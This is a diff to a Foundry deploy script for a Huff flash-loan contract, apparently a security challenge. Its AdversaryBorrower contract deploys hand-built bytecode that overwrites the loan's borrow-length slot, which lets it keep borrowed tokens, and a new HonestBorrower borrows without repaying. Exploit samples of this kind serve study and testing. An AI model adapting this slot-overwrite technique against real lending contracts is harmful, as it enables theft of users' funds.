@@ -1,9 +1,9 @@
 pragma solidity ^0.8.17;
 
-import {Script} from "forge-std/Script.sol";
-import {Token} from "../src/Token.sol";
-import {ITransientLoan} from "../src/interfaces/ITransientLoan.sol";
-import {IFlashLoanReceiver} from "../src/interfaces/IFlashLoanReceiver.sol";
+import { Script } from "forge-std/Script.sol";
+import { Token } from "../src/Token.sol";
+import { ITransientLoan } from "../src/interfaces/ITransientLoan.sol";
+import { IFlashLoanReceiver } from "../src/interfaces/IFlashLoanReceiver.sol";
 
 contract Deployer is Script {
     function run() external {
@@ -17,20 +17,8 @@ contract Deployer is Script {
         cmds[1] = "./src/TransientLoanLive.huff";
         cmds[2] = "-b";
         cmds[3] = "-c";
-        cmds[4] = string(
-            abi.encodePacked(
-                "TOKEN=",
-                bytesToString(abi.encodePacked(mockToken))
-            )
-        );
-        cmds[5] = string(
-            abi.encodePacked(
-                "END=",
-                bytesToString(
-                    abi.encodePacked(uint32(block.timestamp + 1 weeks))
-                )
-            )
-        );
+        cmds[4] = string(abi.encodePacked("TOKEN=", bytesToString(abi.encodePacked(mockToken))));
+        cmds[5] = string(abi.encodePacked("END=", bytesToString(abi.encodePacked(uint32(block.timestamp + 1 weeks)))));
         bytes memory code = vm.ffi(cmds);
 
         ITransientLoan flashLoaner;
@@ -42,15 +30,12 @@ contract Deployer is Script {
         mockToken.mint(address(flashLoaner), type(uint256).max);
 
         // new AdversaryBorrower(flashLoaner, mockToken);
+        // new HonestBorrower(flashLoaner, mockToken);
 
         vm.stopBroadcast();
     }
 
-    function bytesToString(bytes memory data)
-        public
-        pure
-        returns (string memory)
-    {
+    function bytesToString(bytes memory data) public pure returns (string memory) {
         bytes memory alphabet = "0123456789abcdef";
 
         bytes memory str = new bytes(2 + data.length * 2);
@@ -92,25 +77,16 @@ contract AdversaryBorrower is IFlashLoanReceiver {
     /// @notice `IFlashLoanReceiver` implementation
     function bankroll() external {
         // Borrow some of the mock token
-        (bool success, ) = address(flashLoaner).call(
-            abi.encodePacked(
-                bytes4(flashLoaner.borrow.selector),
-                address(mockToken),
-                uint256(10),
-                address(this)
-            )
+        (bool success,) = address(flashLoaner).call(
+            abi.encodePacked(bytes4(flashLoaner.borrow.selector), address(mockToken), uint256(10), address(this))
         );
-        assert(success);
 
         // Deploy contract to overwrite borrow length storage slot
         // PUSH1 0
         // PUSH1 block.timestamp
-        // SSTORE (todo: TSTORE)
-        bytes memory code = bytes.concat(
-            hex"60058060093d393df3600063",
-            abi.encodePacked(block.timestamp),
-            hex"55"
-        );
+        // TSTORE
+        bytes memory code =
+            bytes.concat(hex"60088060093d393df3600063", abi.encodePacked(uint32(block.timestamp)), hex"b4");
         address _exploit;
         assembly {
             _exploit := create(0x00, add(code, 0x20), mload(code))
@@ -124,14 +100,39 @@ contract AdversaryBorrower is IFlashLoanReceiver {
             // Store this contract's address in memory @ 0x00
             mstore(0x00, address())
             // Assign our param's value
-            param := or(
-                shl(0x60, _exploit),
-                and(keccak256(0x00, 0x20), 0xFFFFFFFF)
-            )
+            param := or(shl(0x60, _exploit), and(keccak256(0x00, 0x20), 0xFFFFFFFF))
         }
-        (success, ) = address(flashLoaner).call(
-            abi.encodeWithSelector(flashLoaner.atlas.selector, param)
+        (success,) = address(flashLoaner).call(abi.encodeWithSelector(flashLoaner.atlas.selector, param));
+    }
+}
+
+contract HonestBorrower is IFlashLoanReceiver {
+    /// @notice The transient loan contract
+    ITransientLoan flashLoaner;
+    /// @notice The mock erc20 that will be borrowed
+    Token mockToken;
+
+    constructor(ITransientLoan _flashLoaner, Token _mockToken) {
+        flashLoaner = _flashLoaner;
+        mockToken = _mockToken;
+    }
+
+    /// @notice Initiate the honest loan
+    function borrow() external {
+        flashLoaner.startLoan();
+    }
+
+    ////////////////////////////////////////////////////////////////
+    //                  IFlashLoanReceiver impl                   //
+    ////////////////////////////////////////////////////////////////
+
+    /// @notice `IFlashLoanReceiver` implementation
+    function bankroll() external {
+        // Borrow some of the mock token
+        (bool success,) = address(flashLoaner).call(
+            abi.encodePacked(bytes4(flashLoaner.borrow.selector), address(mockToken), uint256(10), address(this))
         );
-        assert(success);
+
+        // Don't repay
     }
 }
